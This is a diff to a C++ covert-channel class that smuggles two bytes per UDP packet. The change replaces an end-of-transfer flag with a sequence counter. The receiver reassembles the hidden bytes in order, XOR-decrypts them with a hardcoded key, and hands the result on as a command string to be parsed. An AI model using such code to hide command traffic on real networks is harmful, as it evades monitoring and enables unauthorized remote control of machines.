@@ -5,6 +5,8 @@
 #include <vector>
 #include <regex>
 #include "utilities.h"
+#include <sstream>
+#include <iomanip>
 #include <boost/algorithm/string.hpp>
 
 using std::cout;
@@ -22,7 +24,6 @@ Covert_Channel::Covert_Channel()
 
     key = "la732kljl8fuadskl08246akkf32k4jhh5f889df8989";
     server_id = "a1s2d3f4g5";
-    eof_flag = "[Done]";
 }
 
 
@@ -74,9 +75,11 @@ bool Covert_Channel::udp_send(string dest_ip, int dst_port, uchar_vector hidden)
             hidden.erase (hidden.begin(), hidden.begin() + 1);
         }
         string payload = server_id + job_id;
-        if(hidden.size() == 0){
-            payload += eof_flag;
-        }
+
+        std::ostringstream oss;
+        oss << std::setfill('0') << std::setw(server_id.length()) << hidden.size();
+
+        payload += oss.str();//datetimestring
         cout << "Send Payload: " << payload << " hidden: " << dc.hidden.uchar_1 << dc.hidden.uchar_2 << " dx.port: " << dc.uint16 << endl;
         Utilities::xor_crypt(std::to_string(dc.uint16), payload);
         Utilities::xor_crypt(key, payload);
@@ -107,21 +110,26 @@ bool Covert_Channel::udp_recv(uchar_vector v_payload, Address src_address){
 
         cout << "Recv Payload: " << payload << " hidden: " << dc.hidden.uchar_1 << dc.hidden.uchar_2 << " dx.port: " << dc.uint16 << endl;
 
+        string payload_end_tag(payload.begin()+ sid_length + jid_length,
+                        payload.begin() + sid_length + jid_length + server_id.length());
+
+        std::stringstream ss(payload_end_tag);
+                int k;
+                ss >> k;
+
+        string v(std::string(1, static_cast<char>(dc.hidden.uchar_1))
+                + std::string(1, static_cast<char>(dc.hidden.uchar_2)));
+
         bool found = false;
         // check if this is a packet for a current job
         for (auto& kv : jobs) {
             if (kv.first == payload_jid_tag){
                 found = true;
-                kv.second.job.push_back(dc.hidden.uchar_1);
-                kv.second.job.push_back(dc.hidden.uchar_2);
-                if(payload.size() >= 21){
-                    cout << "payload bigger than 21: " << endl;
-                    string payload_end_tag(payload.begin()+ sid_length + jid_length,
-                                           payload.begin() + sid_length + jid_length + eof_flag.length());
-                    if(payload_end_tag == eof_flag){
-                        cout << "Finished job: : " << payload_jid_tag << endl;
-                        finish_transfer(payload_jid_tag);
-                    }
+
+                kv.second.job.insert({k, v});
+                if(k == 0){
+                    cout << "Finished job: : " << payload_jid_tag << endl;
+                    finish_transfer(payload_jid_tag);
                 }
                 break;
             }
@@ -129,8 +137,7 @@ bool Covert_Channel::udp_recv(uchar_vector v_payload, Address src_address){
         // not a current job? make a new job for it
         if(!found){
             Job j;
-            j.job.push_back(dc.hidden.uchar_1);
-            j.job.push_back(dc.hidden.uchar_2);
+            j.job.insert({k, v});
             j.address = src_address;
             jobs.insert({payload_jid_tag, j});
             cout << "Insert New Job: " << payload_jid_tag << " jobs.size(): " << jobs.size() << endl;
@@ -146,13 +153,14 @@ bool Covert_Channel::finish_transfer(string payload_jid_tag){
     cout << "finish_transfer() " << endl;
     for (auto& kv : jobs) {
         if (kv.first == payload_jid_tag){
+            string command_argument;
             cout << "Print Complete job: " << payload_jid_tag << endl;
             cout << "kv.second: ";
-            for (auto& i: kv.second.job)
-                cout << i;
+            for (auto& i: kv.second.job){
+                command_argument += i.second;
+                cout << i.second;
+            }
             cout << endl;
-
-            string command_argument(kv.second.job.begin(), kv.second.job.end());
             split_command_argument_with_regex(command_argument, kv.second);
 
             parse_command(kv.second);
